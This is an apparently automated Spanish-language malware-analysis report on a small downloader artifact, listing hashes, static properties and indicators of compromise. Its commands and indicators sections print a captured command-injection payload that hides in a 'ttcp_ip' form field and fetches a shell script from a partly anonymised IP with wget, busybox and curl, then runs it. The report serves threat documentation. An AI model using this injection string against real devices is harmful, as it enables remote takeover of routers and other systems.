# 🧬 Payload Analysis

`5b5fe6bcbb0f435b694e9665d66bd5276b72563aa60389fcb454f755101605c1`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 446 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5b5fe6bcbb0f435b694e9665d66bd5276b72563aa60389fcb454f755101605c1`
- **MD5:** `c7ffe39e7dfc94c4e66027178e91b4bd`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 446 B |
| Entropía | 5.31 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblk%60&submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&StartEPI=1 | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92. | strings |
| hash | 5b5fe6bcbb0f435b694e9665d66bd5276b72563aa60389fcb454f755101605c1 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
